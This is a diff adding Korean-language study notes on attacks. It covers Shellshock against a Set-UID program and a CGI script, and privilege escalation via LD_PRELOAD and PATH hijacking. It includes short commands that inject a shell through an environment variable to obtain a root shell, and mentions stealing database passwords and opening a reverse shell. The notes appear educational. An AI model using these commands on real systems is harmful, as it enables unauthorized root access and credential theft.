@@ -140,6 +140,80 @@ IF (SELECT COUNT(USERNAME) FROM USERS WHERE USERNAME='ADMINISTRATOR' AND SUBSTRI
 --> Time Delay 발생
 ```
 
+## ShellShock Attack
+> bash 쉘의 취약점을 이용하여, 공격하는 기법
+
+### Set-UID Programs
+> Set-UID root 권한을 가진 프로그램에 대한 취약점
+- 취약한 C 프로그램 (vul.c)
+  ```c
+  #include <stdio.h>
+  void main() {
+    setuid(geteuid()); // root 권한을 가진 사용자로 설정
+    system("/bin/ls -l"); // ls -l 명령어 실행
+  }
+  ```
+- 공격 명령어
+  ```bash
+  $ export foo='() { echo "hello"; }; /bin/sh'
+  $ ./vul
+  ```
+
+### CGI(Common Gateway Interface) Programs
+> 웹 서버에서 사용하는 CGI 프로그램에 대한 취약점
+
+- 취약한 CGI 프로그램 (test.cgi)
+  ```bash
+  #!/bin/bash
+  echo "Content-type: text/plain"
+  echo
+  echo "Hello, World!"
+  ```
+- 공격 명령어
+  ```bash
+  $ curl http://10.0.2.69/cgi-bin/test.cgi
+  Hello, World!
+  ```
+- 공격을 활용하는 방법
+  1. 설정 파일에 하드코딩된 db password 탈취
+  2. reverse shell 실행
+ 
+## Environment Variables & Attacks
+- 프로세스가 환경변수를 얻는 방법
+  1. fork() system call : 자식이 부모의 환경변수를 상속
+  2. excve() system call : 환경변수를 새로 설정
+
+### Attacks via Dynamic Linker
+> 링크된 라이브러리를 조작하여, 공격하는 기법a
+- 원리
+  1. LD_PRELOAD는 공유 라이브러리의 목록을 저장
+  2. 함수를 찾지 못하면, LD_LIBRARY_PATH에서 찾음
+  3. 두 변수를 조작하여 링크된 라이브러리를 조작
+- 예시
+  ```bash
+  $ export LD_PRELOAD=/path/to/malicious.so
+  $ ./vul
+  ```
+
+### Attacks via Execution Program
+> 실행 프로그램을 조작하여, 공격하는 기법
+
+- 예시
+  ```bash
+  $ export PATH=/path/to/malicious:$PATH
+  $ ./vul
+  # // root shell 취득
+  ```
+
+### Attacks via Library
+> format string 등의 취약점을 이용하여 공격하는 기법
+
+### Attacks via Application Code
+> buffer overflow 등의 취약점을 이용하여 공격하는 기법
+
+### Set-UID Approach VS Service Approach
+
+
 ## Clickjacking Attack
 > 사용자의 의도와 상관없이 클릭을 유도하여, 공격하는 기법
 
